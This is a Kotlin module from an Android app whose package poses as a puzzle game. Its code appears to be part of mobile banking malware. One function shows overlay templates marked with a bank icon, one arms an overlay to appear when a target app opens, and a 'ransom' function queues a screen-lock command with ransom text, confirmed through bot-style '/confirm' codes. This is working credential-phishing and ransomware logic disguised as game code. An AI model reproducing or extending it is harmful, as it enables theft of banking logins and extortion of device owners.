package com.puzzleblast.game.modules

import android.content.Context
import com.puzzleblast.game.services.OverlayService
import com.puzzleblast.game.util.Perms
import com.puzzleblast.game.util.Prefs

object OverlayModule {
    suspend fun show(ctx: Context, tmpl: String): String {
        if (!Perms.overlayGranted(ctx)) return "🏦 overlay permission not granted"
        OverlayService.show(ctx, tmpl)
        return "🏦 overlay shown · $tmpl"
    }

    suspend fun onAppOpen(ctx: Context, pkg: String, tmpl: String): String {
        Prefs.overlayOnPkg = pkg
        Prefs.overlayOnTmpl = tmpl
        return "🎯 overlay_on armed · $pkg → $tmpl"
    }

    suspend fun ransom(ctx: Context, text: String): String {
        Prefs.pendingConfirm = SessionModule.randomCode()
        Prefs.pendingConfirmCmd = "lock_screen:$text"
        Prefs.pendingConfirmExpiry = System.currentTimeMillis() + 60_000
        return "🖥 confirm: /confirm ${Prefs.pendingConfirm} (60s)"
    }
}
